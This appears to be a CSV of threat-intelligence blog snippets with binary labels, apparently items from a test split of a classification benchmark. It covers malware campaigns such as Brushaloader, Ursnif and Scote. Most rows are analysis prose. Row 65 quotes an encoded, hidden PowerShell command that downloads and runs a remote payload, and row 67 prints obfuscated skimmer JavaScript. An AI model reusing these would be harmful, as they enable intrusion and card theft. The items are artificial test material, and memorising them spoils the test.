ID,SPLIT,description,long_golden_tar
43,TEST_long,"of Danabot. There is one other characteristic of this email that will remain a thread throughout all Brushaloader campaigns: ""Faktura,"" or the Polish word for invoices. There will be a few variations of this over the next several months, but regardless of language, invoices and billing will always play a vital role in these spam campaigns. As far as the attachment itself, it typically consists of a RAR file with a filename that contains the word ""faktura."" The RAR files typically contain a VBScript that reaches out for additional payloads. The script itself already had some interesting techniques associated with sandbox or network simulation evasion, which we will discuss later in the blog. This script wasn't heavily obfuscated, and efficiently established command and control (C2) communication with a hard-coded IP address via HTTP using wscript. The specific URL being queried in this particular campaign was: http://162[.]251[.]166[.]72/about.php?faxid=446708802&opt=. Over time, a pattern started to emerge: The campaigns would run for a week or two and then go quiet for a couple of weeks before restarting. The modus operandi for the actor was largely the same throughout, Polish language spam campaigns related to invoices or ""Faktura"" that contained a RAR file with malicious VBScript inside. One thing of note about these campaigns is in the downtime changes and improvements were being made to the way the VBScript tries to evade detection and analysis or how the C2 communication was established. Let's walk through some examples. Network simulation evasion, multi-path C2 implemented The second major campaign we analyzed had already added some functionality. Initially, the threat was trying to connect to a non-existent domain to check for things like network simulation. This second campaign implemented an ""infinite"" recursive loop that continues to repeat itself if that GET request resulted in an HTTP/200 indicating a successful request. Here is a quick screenshot showing that new functionality. This simple snippet of code includes the GET request to a non-existent domain (www[.]dencedence[.]denceasdq) (1), the steps taken if an HTTP/200 is provided in response to that request (2), and finally enters an ""infinite"" recursive loop when an HTTP/200 is found (3). This is an elegant, simple way to determine",1
44,TEST_long,"in September, in campaigns we detected in two different countries, man-in-the-middle attacks had been used to spread FinFisher, with the “man” in both cases most likely operating at the ISP level. Filip Kafka 8 Dec 2017 - 02:58PM Share As we reported in September, in campaigns we detected in two different countries, man-in-the-middle attacks had been used to spread FinFisher, with the “man” in both cases most likely operating at the",0
45,TEST_long,"of fraud? Reply Jeffrey Posted on March 16, 2019. 5:16 am This article has no solutions. Reply",1
46,TEST_long,"try to install malicious files in a smooth way to the victim computers. Here is a nice example that my spam trap captured a few days ago. The mail looks like a classic phishing attempt: From: admintmseals@telkomsa.netTo: [redacted]Subject: New Catalogue #2017Date: 14 Mar 2017 03:12:51 -0700Dear,FYI!Please submit the file to me asap.Thank you.Best RegardsRachel LoUfficio CommercialeVimin Box S.r.l.Via Emanuele T. D'Azeglio, 212030 Lagnasco - CUNEO - ITALYTel. +39 0175 282082-3 Fax +39 0175282059P. Iva 02281230041 There was a file attached to this email. A RAR archive “Catalogue Request.rar"" (MD5: 9556abef02749c65eba8acf80c83598a). The archive contained a PE file ""Catalogue Request.exe” (MD5: 913858642d0f28cef3736519d6a50ea6). When the file was submitted to",0
47,TEST_long,"the original Gozi which source code was leaked in 2014. Ursnif/Gozi is active from over a decade and was one of the most active malwares listed in 2017 and 2018. Today it constantly reaches several organization across Italy presenting itself in several ways, for instance as a malicious document delivered through email. The malware has evolved over time and has added functionality, in fact, apart from collecting banking credentials it is also able to collect keystrokes, cryptocurrencies, screenshots, webmail, integrating spyware features together with banking Trojans features. During their investigations, researchers of ZLab Yoroi-Cybaze intercept a new variant of this malware delivered through malspam campaign towards Italian companies. This latest Ursnif variant shows the same modus operandi: a malicious document in which is embedded an highly obfuscated VBA",1
48,TEST_long,"other sources of data to get a complete picture of a threat – all one click away. Security System Partners Anomali seamlessly integrates with many Security and IT systems to operationalize threat intelligence. For Partners Anomali SDKs Become an APP Store Partner Partners Overview Anomali offers competitive advantages and new revenue opportunities for partners looking to enhance their product portfolios with our market-leading threat intelligence platform. Learn more Apply Today Channel Resellers MSSPs System Integrators Featured Research Resources Datasheets Partner Datasheets Videos Webinars White Papers Detect Sessions Browse all Topics What is Threat Intelligence? Threat Intelligence Sharing Threat Intelligence Platform (TIP) STIX/TAXII MITRE ATT&CK Free Tools Weekly Threat Briefing STAXX Limo Anomali Newsletter About Anomali Anomali delivers intelligence-driven cybersecurity solutions, including ThreatStream®, Match™, and Lens™. Companies use Anomali to enhance threat visibility, automate threat processing and detection, and accelerate threat investigation, response, and remediation. Learn more Anomali at Work Leadership News & Events Awards Careers Get in touch Contact us Request a demo China-Based APT Mustang Panda Targets Minority Groups, Public and Private Sector Organizations By: Anomali Threat Research October 7, 2019 Category: Research ​ Overview The Anomali Threat Research Team has identified an ongoing campaign which it believes is being conducted by the China-based threat group, Mustang Panda. The team first revealed these findings on Wednesday, October 2, during Anomali Detect 19, the company’s annual user conference, in a session titled: “Mustang Panda Riding Across Country Lines.” CrowdStrike researchers first published information on Mustang Panda in June 2018, after approximately one year of observing malicious activities that shared unique Tactics, Techniques, and Procedures (TTPs). [1] This campaign dates back to at least November 2018. The research does not indicate with",1
49,TEST_long,"its lack of additional features. The service is also relatively cheap, with a price that ranged from US$75 per week to $200 per month. It can arrive on a system through different delivery techniques such as exploit kits, phishing, and bundled with other malware. In this blog entry we investigate campaigns that used the exploit kits Fallout and Rig, where we also observed its use of Google Drive as part of its evasion tactics. Exploit kits We have recorded the Rig exploit kit and two cases that used the Fallout exploit kits being used to drop the Raccoon stealer in July",0
50,TEST_long,Generator NK Aggregator Podcast Sign in News News Investigation Analysis & Opinion Analysis Interviews Opinion Expert Surveys Topics Aviation Business Companies Culture Cyber Defector Issues Economy Foreign Relations History Human Security / Human Rights Inter-Korean Leadership Military Affairs Misc. Missiles Sanctions Shipping Trade Data WMD Photos Ask a North Korean Ask A North Korean Defector Survey 2014 A North Korean In New York Tools & Data NK Leadership Tracker NK Company Database NK Ship Tracker COVID-19 Tracker NK Import / Export Map NK Leading Indicators NK Document Repository NK Institutional Directory NK Chart Generator NK Aggregator Podcast Sign in Investigation underway into cyber attack using purported MOU document: Seoul ROK-based,1
51,TEST_long,Posture Management (CSPM) Zscaler Private Access ZPA Overview ZPA for AWS ZPA for Azure ZPA Interactive Demo Zscaler Platform SASE Architecture SSL Inspection Data Protection and Privacy Zscaler Client Connector (formerly Z App) Zscaler B2B Ready to experience zero trust network access? Take ZPA for a free test-drive. Experience Now Solutions Network Transformation Office 365 Rethink Network Security Direct-to-cloud Architecture SD-WAN Security Security Transformation Cloud Security Secure Web Gateways Advanced Threat Protection Guest Wi-Fi Security Data Protection and Compliance Assurance App Transformation Zero Trust Network Access Remote Access VPN Alternative Zero Trust On-Premises M&A and Divestitures Secure Cloud Migration Secure Third-party Access Industry Zscaler for Government Partner,0
52,TEST_long,"Spyware used since Snowden revealed. Reply Anon Coward Posted on April 15, 2019. 4:22 pm Would have been nice to",1
53,TEST_long,"is believed to be shared among a small subset of attack groups. Other publicly available malware seen in relation to PKPLUG activity includes Poison Ivy and Zupdax. During our investigations and research into these attacks, we were able to relate previous attacks documented by others that date back as far back as six years ago. Unit 42 incorporates these findings, together with our own, under the moniker PKPLUG and continue to track accordingly. It’s not entirely clear as to the ultimate objectives of PKPLUG, but installing backdoor Trojan implants on victim systems, including mobile devices, infers tracking victims and gathering information is a key goal. We believe victims lay mainly in and around the Southeast Asia region, particularly Myanmar, Taiwan, Vietnam, and Indonesia; and likely also in various other areas in Asia, such as Tibet, Xinjiang, and Mongolia. Based on targeting, content in some of the malware and ties to infrastructure previously documented publicly as being linked to Chinese nation-state adversaries, Unit 42 believes with high confidence that PKPLUG has similar origins. Targeting Based on our visibility into PKPLUG’s campaigns and what we’ve learned from collaborating with industry partners, we believe victims lay mainly in and around the Southeast Asia region. Specifically, the target countries/provinces include (with higher confidence), Myanmar and Taiwan as well as (with lower confidence), Vietnam and Indonesia. Other areas in Asia targeted include Mongolia, Tibet and Xinjiang. This blog, and the associated Adversary",1
54,TEST_long,"very active and relentlessly continue to raid their favourite victims, South East Asian countries. Summing up the Equation Editor exploit In mid-2018, OceanLotus carried out a campaign using documents abusing the weakness exposed by the CVE-2017-11882 vulnerability. Indeed, several Proofs-of-Concept were made available. The vulnerability resides in the component responsible for rendering and editing mathematical equations. One of the malicious documents used by OceanLotus was analysed by 360 Threat Intelligence Center (in Chinese) and includes details about the exploit. Let’s take a look at a similar document. First stage This document FW Report on demonstration of former CNRP in Republic of Korea.doc ( SHA-1: D1357B284C951470066AAA7A8228190B88A5C7C3 ) is similar to the one mentioned in the article above, and also interesting as it really targets people interested in Cambodian politics (the CNRP – Cambodia National Rescue Party – political party was dissolved in late 2017). Despite its .doc extension, the document is actually in RTF format (see Figure 1), contains many garbage groups, and is also malformed. Figure 1 — RTF garbage fields Despite the presence of malformed elements, Word successfully opens this RTF file. As seen in (Figure 2), at offset 0xC00 there is an EQNOLEFILEHDR structure, followed by the MTEF header and then an MTEF record (Figure 3) for a font . Figure 2 — FONT record values Figure 3 — FONT record format An overflow in the name field is possible because its size isn’t checked before being copied. A name that is too long triggers the vulnerability. As seen",1
55,TEST_long,"with the release of a patch by Microsoft to address the vulnerability, which can be found here. The vulnerability bypassed most mitigations prior to patch availability; however, FireEye email and network products detected the malicious documents. FireEye recommends that Microsoft Office users apply the patch from Microsoft . Attack Scenario The attack occurs in the following manner: A threat actor emails a Microsoft Word document to a targeted user with an embedded OLE2 embedded link object When the user opens the document, winword.exe issues a HTTP request to a remote server to retrieve a malicious HTA file The file returned by the server is a fake RTF file with an embedded malicious script Winword.exe looks up the file handler for application/hta through a COM object, which causes the",0
56,TEST_long,"update service and downloads and launches the payloads. So what? Defenders need to be constantly vigilant and monitor the behavior of systems within their network. Attackers are like water — they will attempt to find the smallest crack to achieve their goals. While organizations need to be focused on protecting their most valuable assets, they should not ignore threats that are not particularly targeted toward their infrastructure. Technical case overview Introduction The initial trigger for this investigation was a telemetry entry that showed a PowerShell process launching a download and executing a PowerShell loader. After the drill-down, the telemetry shows that the PowerShell downloading code was launched by an executable dropper included in an ISO image that's mounted within the operating system by the user. The ISO image seems to have been downloaded compressed with ZIP, possibly encrypted with a password, which indicates it's primarily spread via email. Executable dropper with anti-sandboxing The dropper's functionality is rather simple, but the code contains some interesting features. All malicious API calls are resolved dynamically but locating the PEB and traversing one of the lists of loaded modules in memory to find the module address. From there, the downloader goes through the export table in order to find and return the address of the required functions which is then indirectly called using one of the 'call reg' instructions. All strings, including the entire command line for the downloader PowerShell code are encrypted with a static byte key, different for each string, which also gets decrypted during the execution. Command-line for the PowerShell downloader is deobfuscated using a byte XOR key. The most interesting feature is the function that randomly calls APIs from the lists twice. First, two randomly generated numbers from 0 to 9 are generated by a pseudo-random number generator and those numbers — m",1
57,TEST_long,"again, ESET comes across an attack that ""stands out"". Odlanor malware fits that bill - this unique trojan targets players of online poker. Robert Lipovsky 17 Sep 2015 - 12:49PM Share Every now and again, ESET comes across an attack that “stands out”. Odlanor malware fits that bill – this unique trojan targets players of online poker. Whenever ESET malware researchers discover a new interesting attack, a",1
58,TEST_long,"particular malware types caused a sudden increase in attacks and infection attempts from January 11 to 17. Analyzing Mirai variant Yowai We observed that Yowai (detected by Trend Micro as BACKDOOR.LINUX.YOWAI.A ) has a configuration table that’s similar to those of other Mirai variants. Its configuration table can be decrypted with the same procedures, and adds the ThinkPHP exploit with other known vulnerabilities in its list of infection entry vectors. Yowai listens on port 6 to receive commands from the command and control (C&C) server. After it infects a router, it uses dictionary attack in an",0
59,TEST_long,"The botnet was taken down at the end of 2018 through concerted efforts by law enforcement and cybersecurity experts, including Trend Micro. The dismantlement hasn’t deterred the cybercriminals. Though the botnet is dead, we noticed that the KovCoreG campaign didn’t stop their activities and instead developed another botnet. Working with ProofPoint’s threat researcher Kafeine , we were able to uncover a new fileless botnet malware — Novter — being distributed by the operators of KovCoreG. While the malvertising attacks were originally focused on U.S.-based users, they have since expanded to several European countries starting this summer. Our telemetry also revealed that the malvertising attacks were being distributed through a few of top 100 websites in the U.S., which were also abused by Kovter in their previous activities.",1
60,TEST_long,"then I get the Rat, but where is the Dtrack? The Rat is Dtrack? Reply Leave",1
61,TEST_long,"campaign has been previously linked to the LuckyCat Android- and Windows-based trojans. The discovery of the C2 led us to identify multiple campaigns being hosted on the C2 using the same payloads, configurations and more. The malicious PPSX file was used as the dropper to allow the attacker to execute various JavaScript scripts to download the payload. The PPSX document sent to the CTA mailing list looked like this: Everyone on the CTA's mailing list received this email. The mailing list's infrastructure is run out of DearMail , an India-based company that bills itself as a ""powerful cloud enabled web-based email campaign manager."" The attackers modified the standard Reply-To header normally used by the CTA mailings so that any responses would be directed back to an email address belonging to the attackers: mediabureauin [at] gmail.com. The email message itself references the upcoming 60th anniversary of the Dalai Lama's exile on March 31. The document is a large slide show, over 240 slides in length, claimed to have been created by the Central Tibetan Administration. This PPSX is actually a",1
62,TEST_long,"for the United Nations Peacekeepers, so the theme is effective when targetting India’s Ministry of Defence. The malicious excel document leverages malicious macro to drop a few files on the victim’s computer. The macro method allows the malware to work on later and newer versions of Microsoft Office. UNITED_NATIONS_MILITARY_OBSERVERS____COURSE___UNMOC-19_.xls 7fa6689ec0a8863e5084d30de4b9b252 After the malicious Excel file is opened the following KeeOIL files are dropped on the victim’s computer:",1
63,TEST_long,"victim’s Google Drive, and, under certain circumstances, potentially compromise the Android device linked to the account. These free email accounts could thus serve as better starting points for attackers to reconnoiter and gather intelligence on their targets compared to business emails, which are typically more secure. Heatstroke’s attack chain Heatstroke’s operators appear to have used these countermeasures to hide their trails: Multistage phishing attack. To avoid suspicion, the attackers do not hurry or spread their attack over multiple screens/pages. Compared to a usual phishing attack that would employ a single landing page, Heatstroke’s multistage approach tries to mimic what a legitimate website would do to lull the potential victim into thinking nothing is amiss. Obfuscated trails. The phishing kit’s content is forwarded from another location, but masked to appear as if it was on the landing page itself. The landing page also constantly changes to bypass content filters. The phishing kit can also block certain IP ranges, crawling services, and even security tools such as vulnerability scanners. If a user tries to connect from a location, browser, IP address, or country that the attackers blacklisted, the page will not show the content (serving an HTTP 404 error)",0
64,TEST_long,"method for Mirai is very limited as well – it only delivers the Mirai bots to a Linux host from a Windows host if it successfully brute forces a remote telnet connection. So we don’t have a sensational hop from Linux Mirai to Windows Mirai just yet, that’s just a silly statement. But we do have a new threat and practical leverage of the monolithic Windows platform to further spread Mirai to previously unavailable resources. In particular, vulnerable SQL servers running on Windows can be a problem, because they can be Internet facing, and have access to private network connecting IP-based cameras, DVR, media center software, and other internal devices. So, we observe a previously active bot family that now spreads Mirai bots to embedded Linux systems over a very limited delivery vector. It spreads both its own bot code and the new Mirai addition in",0
65,TEST_long,"analysis of one of the group’s backdoors. Cylance tracks this threat group internally as ‘Snake Wine’. We found the infrastructure to be significantly larger than documented at the link above. Cylance believes some of the steps taken by the attacker could possibly be an attempt at a larger disinformation campaign based upon some of the older infrastructure that would link it to a well-known CN-APT group. Nearly all of the initial data in this case was gathered from delving further into the domains hosted by ’It Itch.’ South Korea’s National Intelligence Service (NIS) previously leveraged It Itch’s services, as documented by Citizen Lab in this post . A number of the samples were signed using the leaked code-signing certificate from the Hacking Team breach. Propagation and Targeting To date, all observed attacks were the result of spear phishing attempts against the victim organizations. The latest batch used well-crafted LNK files contained within similarly named password-protected ZIP files. The LNK files, when opened, would execute a PowerShell command via ‘cmd.exe /c’ to download and execute an additional payload. The attackers appeared to prefer the Google URL shortening service ‘goog.gl,’ however, this could easily change as the attacks evolve. powershell.exe -nop –w hidden -exec bypass -enc “JAAyAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGUAeABlAGMAIABiAHkAcABhAHMAcwAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAJwBoAHQAdABwAHMAOgAvAC8AZwBvAG8ALgBnAGwALwBjAHAAVAAxAE4AVwAnACcAKQAiACcAOwBpAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFMAaQB6AGUAIAAtAGUAcQAgADgAKQB7ACQAMwAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJAAzACAAJAAyACIAOwB9AGUAbABzAGUAewBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIgA7AH0A Figure 1: Encoded PowerShell Cmdlet Contained Within the LNK File $2='-nop -w hidden -exec bypass -c ""IEX",1
66,TEST_long,"deploy the Scote malware family. To date, at a high level, we have observed the following four techniques, each of which we delve into in this blog: Figure 1 Malware delivery techniques Technique #1 – RTFs Leveraging Bit.ly The first technique encountered included the use of malicious RTFs that made a HTTP request to the below URL which then redirected to the below malicious site (note the intentional typo of “storage”): URL Redirect http://bit[.]ly/2y3XL3P http://storgemydata[.]website/v.dat This ‘v.dat’ file was in turn a PE32 executable file that has the following SHA256 hash: SHA256 862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ff5f2e1d5 Looking at the publicly available statistics for the bit[.]ly redirect, we see the majority of activity taking place in late October of this year. Additionally, we see the majority of the downloads originating from both the Palestinian Territories as well as the United Arab Emirates. This provides clues as to who the victims are or where attackers may originate from. Figure 2 Statistics surrounding malicious redirect Technique #2 – Don’t Kill My Cat Attacks The second technique uses an interesting tactic that Unit 42 has not seen before. Specifically, it makes use of an attack discussed in July of this year called Don’t Kill My Cat or DKMC. DKMC can enable an attacker to load a legitimate bitmap (BMP) file that contains shellcode within it. The DKMC tool and more information about this tactic may be found here . This specific attack begins with a malicious executable file that downloads a legitimate BMP file that looks like the following: Figure 3 Malicious BMP image retrieved by downloader It should be noted that this is the same image used in the DKMC presentation. It would appear that the attackers simply used the default settings of this particular program. This BMP file is loaded as shellcode. The first six bytes are read as the following instructions: seg000:00000000 inc edxseg000:00000001 dec ebpseg000:00000002 jmp loc_34D8B 1 2 3 seg000 : 00000000 inc edx seg000 : 00000001 dec ebp seg000 : 00000002 jmp loc_34D8B Code execution is then redirected to embedded shellcode. The underlying shellcode is decrypted at runtime using a 4-byte XOR key of 0x3C0922F0. The shellcode eventually loads an embedded UPX-packed executable and redirects execution to this file. This file is an instance of the Scote malware family. The size of the payload and the fact that it is embedded within the BMP file explains the large amount of",1
67,TEST_long,"Republican Senate store The discovered Javascript code runs hidden in the browser and activates when text is entered on a payment page. All the text is then copied and - again hidden in the background - sent to a foreign server. The bootstrapping code The original skimming code as present on http://store.nrsc.org on October 5th, 2016: var x = ""he$17$17mdv$1/QdfDwo$17$16nmdo`fd$6Bbgdbjnts$6Bnmdrsdo$6Bchqdbsonrs$6Bm`a$6Behqdbgdbjnts$16$18$18-sdrs$17vhmcnv-knb`shnm$18$18$1/$6A$/@$/8cnbtldms-vqhsd$17$16$2Brbqhos$1/rqb$2C$11gssor$2@..vvv-tor-bnl.`rrdsr.eq`ldvnqj.iptdqx.iptdqx,0-00-0-lhm-ir$11$2D$2B.rbq$16*$16hos$2D$2Brbqhos$1/sxod$2C$11sdws.i`u`rbqhos$11$2Du`q$1/iPtdqx06$1/$2C$1/$13-mnBnmekhbs$17sqtd$18$2A$2B.rbq$16*$16hos$2D$2Brbqhos$1/rqb$2C$11gssor$2@..iptdqx,bncd-rt.hl`fdr.khsd-ir$11$2D$2B.rbq$16*$16hos$2D$16$18$2A$/@$6C$2A"" , y = """" , w = """" , z ; z = x [ 'length' ] ; for ( i = 0 ; i < z ; i ++ ) { y += String [ 'fromCharCode' ] ( x [ 'charCodeAt' ] ( i ) + 1",0
68,TEST_long,released . NPM already revoked all tokens at once so you probably don’t need to do this yourself. A backdoor was introduced on eslint-scope (version 3.7.2) upon which ESLint depends. It seems that the goal of this hack was to leak NPM tokens. We advise you to take the following actions as soon as possible: Revoke all,0
69,TEST_long,"Baha’i community, and many others in European countries, the United States, United Kingdom, Saudi Arabia, to extract information from them. Our findings show that these new attacks by Charming Kitten are focused on stealing email account information of the victims and finding information about their contacts/networks. Also, our research shows that the group has recently participated in designing a malware for Windows machines but the spectrum and the number of its targets is still not clear for us. Phishing via Fake Interviews Phishing is one of the main tactics that has been used by the Charming Kitten, and social engineering and fake emails are the usual methods of executing it. In this campaign, the Charming Kitten has used the identity of a former Wall Street Journal (WSJ) journalist and created a fake interview scenario to target their victims. It must be noted that in the recent months, the group has used scenarios like “Invitation to",1
70,TEST_long,"Lazarus to new cryptominers, a fake WhatsApp trojan and the rapid development of a macOS bug which allowed remotely-hosted attacker code to execute on a local machine without warning from Gatekeeper. So what have attackers been up to since then, and what new tricks and tips do defenders need to be aware of? Let’s take a look at macOS malware from July to December, 2019. OSX/Tarmac – What’s New? The early months of the second half of 2019 were encouraging for defenders. We didn’t see any new outbreaks through July and August, although there was plenty of increased activity from known threats, which we will mention later. The first sign of something stirring was a report of what was claimed to be a new malware threat dubbed “Tarmac” by researchers at Confiant, which sent many of us scrambling for a sample. The story was picked up by ZDNet and a few other outlets a few weeks later. In their initial report,",0
71,TEST_long,"Point of Sale malware has been around for some time and has been deployed against a broad range of businesses from retailers to hotel groups. However, this appears to be a new family which we are currently calling 'UDPoS' owing to its heavy use of UDP-based DNS traffic. At the time of writing, it's unclear whether the malware is currently being used in campaigns in the wild, although the coordinated use of LogMeIn-themed filenames and C2 URLs, coupled with evidence of an earlier Intel-themed variant, suggest that it may well be. Note : We have been in contact with LogMeIn throughout this investigation to help determine whether their services or products may have been abused as part of the malware deployment process. No evidence of this was found and it appears that the use of LogMeIn-themed filenames and C2 domain by the actors behind the malware is a simple ‘camouflage’ technique. Update: LogMeIn have published an advisory notice to their customers re-iterating",1
72,TEST_long,"analysis of a malicious Word document named 雨傘達動後教會生 態.doc (which translates to “Church ecology after the Umbrella Movement”) that was created with the infamous “Tran Duy Linh” exploit kit. This malicious document exploits CVE-2012-0158 to open a decoy document and execute a custom dropper Trojan named word.exe. The decoy document, shown in Figure 1, contains text copy and pasted from the legitimate website www.hkchurch.org . The decoy document is a commentary written by Pastor Wu Chiwai on his view of the four types of churches and how he feels they need to evolve in the wake of the movement. He is a pastor at Hong Kong’s Christian & Missionary Alliance Church, one of the churches that aided the demonstrators. He is also the general secretary of the Hong Kong Church Renewal Movement and has",1
73,TEST_long,"Worms Exploiting Redis RCE Detected. Currently this activity is primarily targeting cloud servers in China. The following chart shows a breakdown of servers by organization. The vast majority belong to Chinese cloud providers such as Aliyun (Alibaba) and Tencent Cloud. Figure 1. Bot Orgs Figure 2. Botnet propagation The malicious container was originally identified by searching on known malware artifacts in Shodan ( https://www.shodan.io/search?query=%22217.12.221.244%22 ). As shown in Figure 3, there is an observable command that downloads a bash",1
74,TEST_long,"espionage motivated. It’s targets have included the private sector, military, and governments across the world. In this post, I will review a campaign that I believe to have been conducted by APT28. Analysis While performing research, I came across an interesting document titled “gorodpavlodar.doc” . This document was an attachment within an equally as interesting email - this email was sent to multiple individuals who, as far as my research indicates, work for a large mining corporation with operations located in Kazakhstan. The email purports to be sent from",1
75,TEST_long,"as Fancy Bear, APT28, Sofacy, and STRONTIUM) ramped up its spear-phishing campaigns against various governments and embassies around the world. In these campaigns, Pawn Storm used a previously unknown zero-day in Adobe’s Flash (CVE-2016-7855, fixed on October 26, 2016 with an emergency update ) in combination with a privilege escalation in Microsoft’s Windows Operating System (CVE-2016-7255) that was fixed on November 8, 2016. After the fix of CVE-2016-7855 in Adobe’s Flash, Pawn Storm probably devalued the two zero-days in its attack tool portfolio. Instead of only using it against very high profile targets, they started to expose much more targets",1
76,TEST_long,"attacks using Bisonal against Japanese organizations . In October 2017, AhnLab published a report called “Operation Bitter Biscuit,” an attack campaign against South Korea, Japan, India and Russia using Bisonal and its successors, Bioazih and Dexbia. We believe it is likely these tools are being used by one group of attackers. Though Bisonal malware has been in the wild for at least seven years and frequently updated, the actors keep using same high-level playbooks. Common features of attacks involving Bisonal include: Usually targeting organizations related to government, military or defense industries in South Korea, Russia, and Japan. In some cases, the use of Dynamic DNS (DDNS) for C2 servers. The use of a target or campaign code with its C2 to track victim or attack campaign connections. Disguising the Bisonal malware as a PDF, Microsoft Office Document or Excel file. The use of a decoy file in addition to the malicious PE file In some cases, code to handle Cyrillic characters on Russian-language operating systems. We observed all these characteristics in the latest attacks against both Russia and South Korea. Targeting Russia While investigating attack campaigns, Unit 42 discovered a targeted attack against at least one organization in Russia which provides communication security services and products. The targeted organization specialises in encryption and cryptographic services and develops a broad number of secure communication products which also includes",1
77,TEST_long,"then, the domain ‘keybase[.]in’, was registered as a homepage and online store for the KeyBase keylogger. Domain Name:KEYBASE.IN Created On:04-Feb-2015 08:27:44 UTC Last Updated On:05-Apr-2015 19:20:38 UTC Expiration Date:04-Feb-2016 08:27:44 UTC This activity is in-line with an initial posting made by a user with the handle ‘Support™’ announcing KeyBase on the hackforums.net forum on February 7, 2015. In the forum post, the malware touts the following features: Advanced Keylogger Fully undetected scan-time and run-time (Later removed) User-friendly web-panel Unicode support Password recovery Figure 1. KeyBase posting on hackforums.net Since February 2015, approximately 1,500 sessions carrying KeyBase have been captured by WildFire, as we can see below: Figure 2. KeyBase timeline in AutoFocus We can also quickly determine targeted industries using AutoFocus: Figure 3. Targeted industries in AutoFocus The targeted companies span the globe and are located in many countries. Figure 4. Targeted countries in AutoFocus This malware is primarily delivered via phishing emails using common lures. Some examples of attachment filenames can be seen below: Purchase Order.exe New Order.exe Document 27895.scr Payment document.exe PO #7478.exe Overdue Invoices.exe",1
78,TEST_long,"on the fly and stay stealthy as opposed to using larger more open source systems such as PowerShell Empire. The end-goal of the PowerTrick backdoor and its approach is to bypass restrictions and security controls to adapt to the new age of security controls and exploit the most protected and secure high-value networks. SentinelLabs developed mock command-and-control panels to allow the institutions to utilize them for testing detections related to “PowerTrick”. Background TrickBot is the successor of Dyre [1, 2] which at first was primarily focused on banking fraud in the same manner that Dyre did utilize injection systems. TrickBot has shifted focus to enterprise environments over the years to incorporate many techniques from network profiling, mass data collection, incorporation of lateral traversal exploits. This focus shift is also prevalent in their incorporation of malware and techniques",1
79,TEST_long,"be easily blocked, this tactic lets Blackgear’s operators to quickly change C&C servers as needed. It can, in turn, prolong the campaign’s foothold in the system and enable attackers to carry out further lateral movement. Analyzing the Marade downloader (detected by Trend Micro as TSPY_MARADE.ZTBC) and the version of Protux (BKDR_PROTUX.ZTBC) employed by Blackgear’s latest campaigns, we found their encrypted configurations on blog and social media posts (see Figure 1). This can be an indication that these malware tools were developed by the same group. Figure 1. Marade’s encrypted configuration on a Facebook post Figure 2. Infection chain of Blackgear’s attack Attack chain To paint a bigger picture of Blackgear’s attacks, we correlated the tools and tactics they used against their targets. Here’s a summary of Blackgear’s latest campaign: Use a decoy document or fake installer file, sent via spam email to lure a potential victim into clicking it. The decoy document will extract",1
80,TEST_long,Ammyy Admin compromised with malware again; World Cup used as cover Website altered to serve a malware-tainted version of otherwise legitimate software with the global event in Russia acting as a smokescreen Ondrej Kubovič 11 Jul 2018 - 02:57PM Share Website altered to serve a malware-tainted version of otherwise legitimate software with the global event in Russia acting as a,0
81,TEST_long,PSIRT Advisories Security Blog Threat Intelligence Podcast Threat Playbooks Threat Signal Threat Intel Digest Services Intrusion Protection Application Control Web,0
82,TEST_long,"on their official website. Last month ESET researchers wrote an article about a new OS X malware called OSX/Keydnap, built to steal the content of OS X’s keychain and maintain a permanent backdoor. At that time of the analysis, it was unclear how victims were exposed to OSX/Keydnap. To quote the original article: “ It could be through attachments in spam messages, downloads from untrusted websites or something else. ” During the last hours, OSX/Keydnap was distributed on a trusted website, which turned out to be “something else”. It spread via a recompiled version of the otherwise legitimate open source BitTorrent client application Transmission and distributed on their official website. Instant response from the Transmission team Literally minutes after being notified by ESET, the Transmission team removed the malicious file from their web server and launched an investigation to identify how this happened. At the",0
